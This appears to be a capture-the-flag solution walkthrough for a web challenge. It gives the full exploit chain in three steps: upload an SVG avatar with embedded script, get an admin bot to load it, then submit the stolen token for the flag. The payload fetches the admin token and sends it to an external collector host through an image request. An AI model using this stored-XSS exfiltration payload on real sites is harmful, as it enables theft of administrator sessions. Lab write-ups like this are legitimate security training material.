Full chain.

1. Upload the scripted avatar (multipart; the file part must be declared
   `image/svg+xml` and start with `<svg`):

   ```
   POST /avatar
   Content-Type: multipart/form-data; boundary=----X

   ------X
   Content-Disposition: form-data; name="avatar"; filename="x.svg"
   Content-Type: image/svg+xml

   <svg xmlns="http://www.w3.org/2000/svg"><script>
     fetch('/admin/token').then(r=>r.text()).then(t=>{
       new Image().src='http://collector:9000/report?t='+encodeURIComponent(t)})
   </script></svg>
   ------X--
   ```

   The response gives you `{"uuid":"…","profile":"/u/<uuid>"}`.

2. Report the profile so the admin bot loads it:

   ```
   POST /report
   Content-Type: application/json

   {"url":"/u/<uuid>"}
   ```

3. Wait ~2s (plus settle) for the bot. Then read the collector through the app
   proxy:

   ```
   GET /oob/received
   ```

   You will see an item with a path like `/report?t=<32 hex>`. That hex value is
   the admin session token. Submit it:

   ```
   POST /solve
   Content-Type: application/json

   {"c":"<32 hex>"}
   ```

   and you get `FLAG{…}`. `tests/exploit.py` performs exactly these steps and
   also asserts that `GET /admin/token` is `403` without the admin cookie.
